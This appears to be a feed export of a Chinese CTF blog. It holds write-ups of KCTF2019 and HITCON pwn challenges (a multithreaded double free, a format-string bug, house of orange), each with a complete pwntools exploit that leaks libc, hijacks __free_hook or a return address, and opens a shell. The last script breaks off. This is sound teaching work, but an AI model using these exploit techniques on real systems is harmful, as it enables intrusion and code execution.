class="number">0x10</span>)</span><br><span class="line">        delete(i)</span><br><span class="line">        add(i,<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'\x91'</span>)</span><br><span class="line">        delete(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">14</span>,<span class="string">'0000'</span>)</span><br><span class="line">    add(<span class="number">15</span>,<span class="string">'1111'</span>)</span><br><span class="line">    add(<span class="number">16</span>,<span class="string">'2222'</span>)</span><br><span class="line">    add(<span class="number">17</span>,<span class="string">'3333'</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">18</span>,<span class="string">"4444"</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">19</span>,<span class="string">"5555"</span>)</span><br><span class="line">    add(<span class="number">20</span>,<span class="string">"6666"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">##unlink</span></span><br><span class="line">    delete(<span class="number">16</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p64(<span class="number">0x404178</span><span class="number">-0x18</span>)+p64(<span class="number">0x404178</span><span class="number">-0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0x20</span>) + <span class="string">'\x90'</span></span><br><span class="line">    heap_ptr = add(<span class="number">31</span>,payload)</span><br><span class="line">    <span class="keyword">print</span> hex(heap_ptr)</span><br><span class="line">    heap_base = heap_ptr - <span class="number">0x5a0</span></span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">##double free</span></span><br><span class="line">    add(<span class="number">17</span>,<span class="string">'\n'</span>)</span><br><span class="line">    add(<span class="number">21</span>,<span class="string">'\n'</span>)</span><br><span class="line">    add(<span class="number">22</span>,<span class="string">'\n'</span>) <span class="comment">#22==18</span></span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span class="line">    delete(<span class="number">22</span>)</span><br><span class="line">    delete(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">18</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(heap_base+<span class="number">0x260</span>))</span><br><span class="line">    add(<span class="number">22</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">##unlink</span></span><br><span class="line">    add(<span class="number">23</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x404060</span><span class="number">-0x18</span>)+p64(<span class="number">0x404060</span><span class="number">-0x10</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">14</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x300</span>)+<span class="string">'\x90'</span>)</span><br><span class="line">    delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x404170</span>)</span><br><span class="line">    edit(<span class="number">31</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">31</span>)</span><br><span class="line">    <span class="comment">#get 0x404170 in chunks</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">31</span>,p64(<span class="number">0x404170</span>)*<span class="number">3</span>+p32(<span class="number">1</span>)+p32(<span class="number">5</span>))</span><br><span class="line">    edit(<span class="number">23</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">    Show(<span class="number">23</span>)</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p.recvuntil(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - libc_offset</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    shell_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">30</span>,p64(free_hook))</span><br><span class="line">    edit(<span class="number">30</span>,p64(shell_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">14</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;d86d52b3-8794-4b81-babf-24a2ef30dc65&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>KCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>绝地逃生</title>
    <url>/2020/09/03/2019_kctf/jediescape/</url>
    <content><![CDATA[<h1 id="KCTF-jediescape"><a href="#KCTF-jediescape" class="headerlink" title="KCTF jediescape"></a>KCTF jediescape</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>多线程的题，做题的时候漏洞没找到，记录一下</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序有三个功能，分配，释放和输出。</p>
<p><img src="/2020/09/03/2019_kctf/jediescape/1.jpg" alt="main"></p>
<p>分配部分可以自己选择bss存储数组的index，size不能为0，之后输入数据</p>
<p><img src="/2020/09/03/2019_kctf/jediescape/2.jpg" alt="malloc"></p>
<p>Free部分读取的是一个范围start-end，释放的是start-end-1的chunk，这里start小于end且end不大于255，之后选择线程数量，通过start_routine函数进行释放</p>
<p><img src="/2020/09/03/2019_kctf/jediescape/3.jpg" alt="free"></p>
<p><img src="/2020/09/03/2019_kctf/jediescape/4.jpg" alt="free2"></p>
<p>start_routine函数里是一个循环，_InterlockedExchangeAdd8这个函数的功能是arg1指向的位置值+arg2，即<em>(end_index+8)+1。返回值为</em>(end_index+8)的初始值。看Free函数可以看到end_index2+8位置的v12是char类型，这意味着v12为255的时候，+1即变为0。</p>
<p>start_routine里每次执行这个函数，之后比较end_index和start_index，相等即退出，否则释放(bss数据不为空)</p>
<p><img src="/2020/09/03/2019_kctf/jediescape/5.jpg" alt="start_routine"></p>
<p>Puts函数在数组index处值不为空时输出</p>
<p><img src="/2020/09/03/2019_kctf/jediescape/6.jpg" alt="puts"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里利用的是start_routine的逻辑问题，我们取start为254，end为255，线程数为2。在第一个线程里，chunk_254被释放后变为255，执行函数，255+1变成了0，函数返回值为255，比较之后符合条件break。此时在第二个线程里*(end_index+8)的值为0，+1变为1，返回值为0，成功绕过了检查，相当于从0-254又释放了一遍，254的块double free。</p>
<p>在0位置处malloc一个0x90的堆，根据刚才的原理，0会被释放，之后放入unsorted bin，但是因为数据没有清空，可以Puts泄露Libc </p>
<p>调试发现每个线程都有自己的thread_arena，即线程分配区。每次子线程结束的时候都会把tcache中的chunk放到对应大小的fastbin或者unsorted bin。这也导致我们不能用刚才那种最简单的方式(tcache加入fastbin的时候有重复检查，start可以选择253)</p>
<p>还有一个发现是malloc一个fastbin范围的内存时，如果tcache没有满，fastbin就会放入tcache中(晓晨师姐说之前0CTF还是LCTF有道类似的题,todo)，我们可以利用fast bin的double free修改其fd，再malloc的时候即可从tcache里分配到指定内存地址。</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./fastheap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    libc_offset = <span class="number">0x3ebc40</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'152.136.18.34'</span>,<span class="number">10000</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    libc_offset = <span class="number">0x3ebc40</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Malloc</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Contents: '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(start_index,end_index,workers)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index range: '</span>)</span><br><span class="line">    p.sendline(str(start_index)+<span class="string">'-'</span>+str(end_index))</span><br><span class="line">    p.recvuntil(<span class="string">'Number of workers: '</span>)</span><br><span class="line">    p.sendline(str(workers))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Puts</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    Malloc(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">252</span>:</span><br><span class="line">            Malloc(i,<span class="number">0x60</span>,str(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Malloc(i,<span class="number">0x30</span>,str(i))</span><br><span class="line"></span><br><span class="line">    Free(<span class="number">253</span>,<span class="number">255</span>,<span class="number">2</span>)<span class="comment">#free 254 + [0,254]</span></span><br><span class="line"></span><br><span class="line">    Puts(<span class="number">0</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - libc_offset</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base)) </span><br><span class="line">    shell_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">    log.success(<span class="string">'malloc hook =&gt;'</span> + hex(malloc_hook))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Malloc(<span class="number">253</span>,<span class="number">0x60</span>,p64(fake_chunk))</span><br><span class="line">    Malloc(<span class="number">254</span>,<span class="number">0x60</span>,<span class="string">'1'</span>)</span><br><span class="line">    Free(<span class="number">3</span>,<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Malloc(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'1'</span>)</span><br><span class="line">    Malloc(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x23</span>+p64(shell_addr))</span><br><span class="line">    Malloc(<span class="number">5</span>,<span class="number">0x10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    <span class="comment">#trigger</span></span><br><span class="line">    Free(<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://bbs.pediy.com/thread-252168.htm" target="_blank" rel="noopener">kctf_jackandkx</a></p>
]]></content>
      <categories>
        <category>KCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>金字塔的诅咒</title>
    <url>/2020/09/03/2019_kctf/CurseofPyramid/</url>
    <content><![CDATA[<h1 id="KCTF2019-CurseofPyramid"><a href="#KCTF2019-CurseofPyramid" class="headerlink" title="KCTF2019 CurseofPyramid"></a>KCTF2019 CurseofPyramid</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看雪CTF2019的题，bss的格式化字符串，比较通用的解决思路，稍微记录一下</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序就一个Main函数，里面printf一个bss段的用户输入值</p>
<p><img src="/2020/09/03/2019_kctf/CurseofPyramid/1.jpg" alt="main"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>可以多次利用漏洞，调试下到断点看到栈里有关于程序加载基址，栈地址，libc地址的值，挨个泄露出来。</p>
<p>断点到printf继续看栈，栈里有两个地址比较有趣,0xfff2e1e4和0xfff2e1e8，可以使用%n把0xfff2e274地址的值改为target_addr，用%n把0xfff2e27c地址的值改为target_addr+2。之后再到0xfff2e274把target_addr的值修改2字节，到0xfff2e27c把target_addr+2对的值修改2字节，即可完成任意地址任意写。</p>
<p>这里的target_addr即返回地址所在的栈地址，覆写成功即可返回到shell_addr   </p>
<p><img src="/2020/09/03/2019_kctf/CurseofPyramid/2.jpg" alt="stack1"></p>
<p><img src="/2020/09/03/2019_kctf/CurseofPyramid/3.jpg" alt="stack2"></p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">"./format"</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'152.136.18.34'</span>,<span class="number">9999</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">    gadgets = [<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Input</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'What do tou want to say:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ValToLis</span><span class="params">(value)</span>:</span></span><br><span class="line">    value_high = value &gt;&gt; <span class="number">16</span></span><br><span class="line">    value_low = value &amp; <span class="number">0xffff</span></span><br><span class="line">    value_lis = []</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    value_lis.append(value_low &amp; 0xff)</span></span><br><span class="line"><span class="string">    value_lis.append(value_low &gt;&gt; 8)</span></span><br><span class="line"><span class="string">    value_lis.append(value_high &amp; 0xff)</span></span><br><span class="line"><span class="string">    value_lis.append(value_high &gt;&gt; 8)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    value_lis.append(value_low)</span><br><span class="line">    value_lis.append(value_high)</span><br><span class="line">    <span class="keyword">return</span> value_lis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak code base</span></span><br><span class="line">    Input(<span class="string">'%3$p'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">    code_base = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">0x8f3</span></span><br><span class="line">    log.success(<span class="string">'code base =&gt; '</span> + hex(code_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Input(<span class="string">'%11$p'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">    libc_base = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">247</span> - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#leak stack</span></span><br><span class="line">    Input(<span class="string">'%5$p'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">    ebp_addr = int(p.recvline().strip(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">16</span>) - <span class="number">172</span></span><br><span class="line">    target_addr = ebp_addr + <span class="number">20</span></span><br><span class="line">    <span class="comment">## first 17$p then 53$p</span></span><br><span class="line">    <span class="comment">## first 18$p  then 55$p</span></span><br><span class="line">    log.success(<span class="string">'ebp addr =&gt; '</span> + hex(ebp_addr))</span><br><span class="line">    <span class="comment">#3 get shell</span></span><br><span class="line">    echo_addr = code_base + <span class="number">0x200c</span></span><br><span class="line">    <span class="comment">#overwrite 0xff87ed84 to 0xff87ecdc</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#first</span></span><br><span class="line">    val_lis = ValToLis(target_addr)</span><br><span class="line">    payload = <span class="string">'%'</span>+str(val_lis[<span class="number">0</span>])+<span class="string">'c%17$hn'</span></span><br><span class="line">    Input(payload)</span><br><span class="line">    <span class="comment">#second</span></span><br><span class="line">    val_lis = ValToLis(target_addr+<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">'%'</span>+str(val_lis[<span class="number">0</span>])+<span class="string">'c%18$hn'</span></span><br><span class="line">    Input(payload)</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    log.success(<span class="string">'shell addr =&gt; '</span> + hex(shell_addr))</span><br><span class="line">    shell_lis = ValToLis(shell_addr)</span><br><span class="line">    <span class="keyword">print</span> shell_lis</span><br><span class="line">    <span class="comment">#first</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = <span class="string">'%'</span>+str(shell_lis[<span class="number">0</span>])+<span class="string">'c%53$hn'</span></span><br><span class="line">    Input(payload)</span><br><span class="line">    <span class="comment">#second</span></span><br><span class="line">    payload = <span class="string">'%'</span>+str(shell_lis[<span class="number">1</span>])+<span class="string">'c%55$hn'</span></span><br><span class="line">    Input(payload)</span><br><span class="line">    Exit()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">flag&#123;c6671fc0-cea3-42ef-8af0-c20c65f854be&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>KCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>house of orange</title>
    <url>/2020/09/03/HouseOfOrange/house_of_orange/</url>
    <content><![CDATA[<h1 id="house-of-orange专题总结"><a href="#house-of-orange专题总结" class="headerlink" title="house-of-orange专题总结"></a>house-of-orange专题总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在BUUCTF刷题，见到了house-of-orange真题，当时学的时候只是大概了解了原理，正好结合文件攻击总结一下</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>house of orange 是一种堆利用手段，给的题目中没有free函数，攻击者可以通过覆写top chunk的size字段修改其为一个比较小的值，之后在malloc一个大于此值的chunk的时候让原top chunk进入unsorted bin，而原堆块通过brk或者mmap扩展，再从中分配堆块。通过这种方式可以让top chunk进入unsorted bin，从而间接free堆块。  </p>
<p>题目特征就是没有Free，需要有一个堆溢出的漏洞可以利用。构造的时候注意top_chunk_addr + fake_size要是0x1000对齐，一般把倒数第三个字节改成0x00即可</p>
<h2 id="Hitcon-CTF-house-of-orange"><a href="#Hitcon-CTF-house-of-orange" class="headerlink" title="Hitcon-CTF house of orange"></a>Hitcon-CTF house of orange</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目一共有三个功能，Build、See和Upgrade分别对应Add、Show和Edit.</p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/1.jpg" alt="menu"></p>
<p>Build函数可以Build 4个堆块，最大可以分配的size为0x1000，每次先分配一个house_chunk，其中存储price_chunk和name_chunk，读取price、name和color</p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/2.jpg" alt="build"></p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/3.jpg" alt="house"></p>
<p>See函数可以打印出house的name和price和color等内容</p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/4.jpg" alt="see"></p>
<p>Upgrade有一个读取length并根据length编辑的溢出，溢出长度最多可达0x1000</p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/5.jpg" alt="upgrade"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先分配一个堆块，利用Upgrade修改top chunk的size，再Malloc一个较大的堆块，使得top chunk进入unsorted bin。再Malloc一个large bin，从unsorted bin中切割出来，利用其bk泄露libc地址，再Upgrade这个large bin，可以用fd_next_size泄露heap地址。</p>
<p>再使用Upgrade溢出修改Unsorted bin，结构为：<br>“/bin/sh\x00”+p64(0x61)<br>p64(0)+p64(_IO_list_all-0x10)<br>p64(2)+p64(3)<br>‘\x00’*0xa8<br>fake_vtable_addr</p>
<p>之后Malloc一个堆块的时候会触发unsorted bin attack，具体的原理在之前SCTF的easy heap中有介绍，最终去执行fake table的system函数，参数为fp的”/bin/sh\x00”  </p>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./houseoforange_hitcon_2016'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./houseoforange_hitcon_2016'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20044</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Build</span><span class="params">(size,name,price,color)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice : '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Length of name :"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Name :"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">"Price of Orange:"</span>)</span><br><span class="line">    p.sendline(str(price))</span><br><span class="line">    p.recvuntil(<span class="string">'Color of Orange:'</span>)</span><br><span class="line">    p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">See</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice : '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Upgrade</span><span class="params">(size,name,price,color)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice : '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Length of name :"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">"Price of Orange: "</span>)</span><br><span class="line">    p.sendline(str(price))</span><br><span class="line">    p.recvuntil(<span class="string">'Color of Orange:'</span>)</span><br><span class="line">    p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Build(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line">    Upgrade(<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line">    Build(<span class="number">0x1000</span>,<span class="string">'b'</span>*<span class="number">8</span>,<span class="number">2</span>,<span class="number">2</span>)<span class="comment">#2</span></span><br><span class="line">    <span class="comment">#get unsorted bin</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Build(<span class="number">0x400</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="comment">#3</span></span><br><span class="line">    See()</span><br><span class="line">    p.recvuntil(<span class="string">'Name of house : aaaaaaaa'</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">1640</span> - libc_offset</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">3</span>]</span><br><span class="line">    io_list_all = libc_base + <span class="number">0x3c5520</span></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    Upgrade(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="comment">#2</span></span><br><span class="line">    See()</span><br><span class="line">    p.recvuntil(<span class="string">'Name of house : aaaaaaaaaaaaaaaa'</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xc0</span></span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">    <span 